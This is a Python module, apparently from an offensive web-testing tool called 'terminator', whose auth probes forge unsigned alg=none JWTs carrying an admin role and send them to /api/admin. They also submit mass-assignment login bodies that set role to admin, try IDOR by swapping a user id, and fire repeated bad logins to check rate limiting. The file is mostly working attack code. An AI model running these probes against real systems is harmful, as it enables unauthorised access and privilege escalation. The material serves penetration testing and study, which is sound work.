"""Auth-related probes: JWT, IDOR, mass assignment, rate limit."""

import base64
import json
import time
import urllib.error
import urllib.request

from terminator.core.memory import load_findings, now, save_findings
from terminator.tools.http import request_method, web_base
from terminator.tools.probe_http import build_get_url, fetch_get, save_probe

USER_DB = {
    "1": {"id": 1, "name": "demo", "role": "user"},
    "2": {"id": 2, "name": "admin", "role": "admin", "email": "admin@cyborg.local"},
}


def _b64url(data: dict) -> str:
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def craft_none_jwt(sub: str = "demo", role: str = "admin") -> str:
    header = _b64url({"alg": "none", "typ": "JWT"})
    body = _b64url({"sub": sub, "role": role, "exp": int(time.time()) + 3600})
    return f"{header}.{body}."


def probe_jwt(target: str, payload: str = "", path: str = "", param: str = "") -> str:
    base, err = web_base(target)
    if not base:
        return err

    admin_url = base.rstrip("/") + "/api/admin"
    token = payload.strip() if payload else craft_none_jwt()
    signals = []
    vulnerable = False

    req = urllib.request.Request(
        admin_url,
        headers={"User-Agent": "terminator", "Authorization": f"Bearer {token}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as res:
            body = res.read(800).decode("utf-8", errors="replace")
            status = res.status
    except urllib.error.HTTPError as exc:
        body = exc.read(800).decode("utf-8", errors="replace") if exc.fp else ""
        status = exc.code

    if ".none." in token.lower() or token.endswith(".") or '"alg":"none"' in token.lower():
        signals.append("alg=none style token")
    if "admin" in token:
        signals.append("admin claim in token")
    if status == 200 and "secret" in body:
        signals.append("admin endpoint accessible")
        vulnerable = True
    if "admin panel key" in body:
        signals.append("admin secret leaked")

    lines = [
        "=== probe_jwt ===",
        f"target: {base}",
        f"endpoint: GET /api/admin",
        f"token: {token[:80]}...",
        f"status: {status}",
        f"vulnerable: {vulnerable}",
        f"signals: {', '.join(signals) or 'none'}",
        f"body: {body[:200]}",
    ]
    save_probe("probe_jwt", {
        "target": base,
        "path": "/api/admin",
        "param": "Authorization",
        "payload": token[:120],
        "vulnerable": vulnerable,
        "signals": signals,
        "contexts": signals,
    })
    return "\n".join(lines)


def check_auth_bypass(target: str) -> str:
    base, err = web_base(target)
    if not base:
        return err
    sections = [
        probe_jwt(base),
        probe_mass_assignment(base, '{"username":"demo","password":"demo","role":"admin"}'),
    ]
    return "=== auth bypass check ===\n\n" + "\n\n".join(sections)


def probe_idor(target: str, path: str, param: str, payload: str) -> str:
    base, err = web_base(target)
    if not base:
        return err
    path = path or "/user"
    param = param or "id"
    baseline = fetch_get(build_get_url(base, path, param, "1"))
    injected = fetch_get(build_get_url(base, path, param, payload or "2"))
    signals = []
    if injected.get("status") == 200 and "admin" in (injected.get("body") or "").lower():
        signals.append("foreign object returned")
    if baseline.get("body") != injected.get("body"):
        signals.append("response differs from baseline id=1")
    if "no ownership check" in (injected.get("body") or ""):
        signals.append("server admits missing ownership check")
    vulnerable = bool(signals) and injected.get("status") == 200

    lines = [
        "=== probe_idor ===",
        f"target: {base}",
        f"request: GET {path}?{param}={payload or '2'}",
        f"status: {injected.get('status')}",
        f"vulnerable: {vulnerable}",
        f"signals: {', '.join(signals) or 'none'}",
        f"url: {build_get_url(base, path, param, payload or '2')}",
    ]
    save_probe("probe_idor", {
        "target": base, "path": path, "param": param,
        "payload": payload or "2", "vulnerable": vulnerable,
        "signals": signals, "contexts": signals,
    })
    return "\n".join(lines)


def check_idor(target: str, payload: str = "", path: str = "", param: str = "") -> str:
    return probe_idor(target, path or "/user", param or "id", payload or "2")


def probe_mass_assignment(target: str, payload: str = "", path: str = "", param: str = "") -> str:
    base, err = web_base(target)
    if not base:
        return err
    body_raw = payload or json.dumps({"username": "demo", "password": "demo", "role": "admin"})
    login = request_method(base.rstrip("/") + "/api/login", "POST", body_raw.encode())
    signals = []
    vulnerable = False
    try:
        data = json.loads(login.get("body", "{}"))
    except json.JSONDecodeError:
        data = {}
    token = data.get("token")
    role = (data.get("user") or {}).get("role")
    if role == "admin":
        signals.append("login response grants admin role")
        vulnerable = True
    if token:
        admin = urllib.request.Request(
            base.rstrip("/") + "/api/admin",
            headers={"User-Agent": "terminator", "Authorization": f"Bearer {token}"},
        )
        try:
            with urllib.request.urlopen(admin, timeout=8) as res:
                admin_body = res.read(300).decode("utf-8", errors="replace")
                if res.status == 200:
                    signals.append("admin API reachable after mass assignment")
                    vulnerable = True
        except urllib.error.HTTPError:
            pass

    lines = [
        "=== probe_mass_assignment ===",
        f"target: {base}",
        f"POST /api/login body: {body_raw[:120]}",
        f"login status: {login.get('status')}",
        f"vulnerable: {vulnerable}",
        f"signals: {', '.join(signals) or 'none'}",
    ]
    save_probe("probe_mass_assignment", {
        "target": base, "path": "/api/login", "param": "JSON body",
        "payload": body_raw[:120], "vulnerable": vulnerable,
        "signals": signals, "contexts": signals,
    })
    return "\n".join(lines)


def check_rate_limit(target: str) -> str:
    base, err = web_base(target)
    if not base:
        return err
    url = base.rstrip("/") + "/api/login"
    body = json.dumps({"username": "demo", "password": "wrong"}).encode()
    statuses = []
    for _ in range(8):
        result = request_method(url, "POST", body)
        statuses.append(result.get("status"))
    has_429 = 429 in statuses
    all_same = len(set(statuses)) <= 2
    vulnerable = not has_429 and all_same
    lines = [
        "=== check_rate_limit ===",
        f"target: {base}",
        f"attempts: 8 bad logins",
        f"statuses: {statuses}",
        f"vulnerable: {vulnerable}",
        f"note: {'no rate limit detected' if vulnerable else 'rate limit or varying responses'}",
    ]
    save_findings({**load_findings(), "target": base, "updated": now(), "rate_limit": {"vulnerable": vulnerable, "statuses": statuses}})
    return "\n".join(lines)
